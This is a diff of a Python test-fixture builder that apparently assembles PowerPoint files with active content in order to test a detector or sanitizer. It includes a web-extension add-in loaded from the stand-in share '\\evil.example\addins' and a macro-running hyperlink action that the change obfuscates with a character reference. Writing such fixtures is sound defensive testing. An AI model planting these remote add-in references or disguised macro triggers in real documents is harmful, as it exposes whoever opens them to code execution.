@@ -222,10 +222,10 @@ def active_content(entries):
         f'{DECL}<we:webextension xmlns:we="{web_ns}" id="{{A0B1C2D3-0000-4000-8000-000000000001}}">'
         '<we:reference id="wa000000001" version="1.0.0.0" store="\\\\evil.example\\addins" storeType="Filesystem"/>'
         '<we:alternateReferences/><we:properties/><we:bindings/><we:snapshot/></we:webextension>')
-    # An action that runs a macro, in a layout whose only relationship is its master: an action
-    # is found by its name, whatever the part relates to.
+    # An action that runs a macro, spelled with a character reference, in a layout whose only
+    # relationship is its master: every kept part is read, and an action is found however written.
     other = "ppt/slideLayouts/slideLayout3.xml"
-    parts[other] = parts[other].replace("</p:spTree></p:cSld>", linking(24, "Macro", '<a:hlinkClick r:id="" action="ppaction://macro?name=Run"/>') + "</p:spTree></p:cSld>", 1)
+    parts[other] = parts[other].replace("</p:spTree></p:cSld>", linking(24, "Macro", '<a:hlinkClick r:id="" action="&#112;paction://macro?name=Run"/>') + "</p:spTree></p:cSld>", 1)
     # Legacy VML, as Office writes it: not well-formed XML, and never read, since it goes unparsed.
     parts["ppt/drawings/vmlDrawing1.vml"] = b'<xml xmlns:v="urn:schemas-microsoft-com:vml"><v:shape id="_x0000_s1025"><br></v:shape></xml>'
     parts["ppt/embeddings/Microsoft_Word_Document.docx"] = b"An embedded document, not opened by any fixture.\n"
